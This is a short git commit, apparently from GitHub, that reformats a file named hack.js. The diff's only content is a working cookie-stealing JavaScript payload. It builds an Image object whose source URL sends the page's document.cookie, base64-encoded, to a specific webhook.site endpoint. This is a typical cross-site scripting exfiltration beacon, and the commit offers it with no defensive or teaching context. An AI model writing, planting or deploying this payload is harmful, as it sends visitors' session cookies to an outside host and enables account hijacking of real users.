eb61b1110b6af8784eb2d8ac3771205c3aa89c9e
c0mrad3 <106001817+aedicious@users.noreply.github.com>
2025-01-04 19:52:32 +0300

    Update hack.js

--- hack.js
+++ hack.js
@@ -1,1 +1,2 @@
-x = new Image(); x.src = 'https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0?data='+btoa(document.cookie);
+x = new Image();
+x.src = 'https://webhook.site/4dea91f9-3181-4bae-a70b-7744b639b4e0?data='+btoa(document.cookie);
